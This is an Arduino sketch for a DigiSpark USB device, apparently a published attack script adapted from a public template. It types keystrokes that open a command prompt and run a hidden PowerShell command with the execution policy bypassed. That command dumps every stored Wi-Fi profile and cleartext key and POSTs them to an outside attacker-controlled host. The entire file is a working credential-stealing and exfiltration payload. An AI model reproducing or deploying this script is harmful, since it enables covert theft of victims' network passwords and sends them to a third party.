//This script grabs all stored wireless network credentials and forwards them via http(s) 
//to an attacker controlled server (created to work best with Synergy-Httpx as the receiver).  
//I edited a template from https://github.com/CedArctic/DigiSpark-Scripts/ to make this.

#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2300);
  DigiKeyboard.print(F("powershell -NoP -W Hidden -ep Bypass \"$n=$f=@();netsh wlan show profiles | Select-String ':(.+)$' | %{$n += (echo $_.Matches.Groups[0].Value.Trim(': '))}; $n | %{$k=((netsh wlan show profile name=$_ key=clear | findstr 'Key Content') -split ': ')[1];$f+=\\\"$_ \: $k\\\"}; irm -Uri https://t3l3machus.com/aWq8tY -Method POST -body ($f -join('<br>'))\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ }
}
